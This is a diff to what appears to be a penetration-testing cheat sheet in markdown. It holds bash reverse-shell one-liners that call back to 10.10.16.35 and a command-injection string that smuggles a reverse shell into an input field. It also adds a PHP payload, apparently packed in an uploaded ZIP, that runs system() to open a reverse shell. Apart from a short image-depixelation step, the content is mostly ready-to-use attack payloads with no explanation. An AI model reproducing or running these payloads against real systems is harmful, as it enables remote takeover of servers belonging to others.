@@ -529,7 +529,7 @@ assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)
 
 ### Get Reverse Shell:
 
-```
+```bash
 ;$(bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1');
 
 bash -i >& /dev/tcp/10.10.16.35/1234 0>&1 (payload)
@@ -541,9 +541,19 @@ test;echo 'bash -i >& /dev/tcp/10.10.16.35/9001 0>&1' | bash;
 
 ### Depixelate images
 
-```
+```bash
 pdfimages <pdf-file> <output-file>
 python3 depix.py -p <pixelized-image>.ppm -s <reference-image>
+```
+
+### Reverse shell using ZIP file:
+
+{% file src=".gitbook/assets/rce.zip" %}
+
+the code in this:
+
+```php
+<?php echo system("echo 'bash -i >& /dev/tcp/10.10.16.35/9001 0>&1' | bash;") ?>bash
 ```
 
 #### Opposite to Keyhacks -> nokeyhacks:
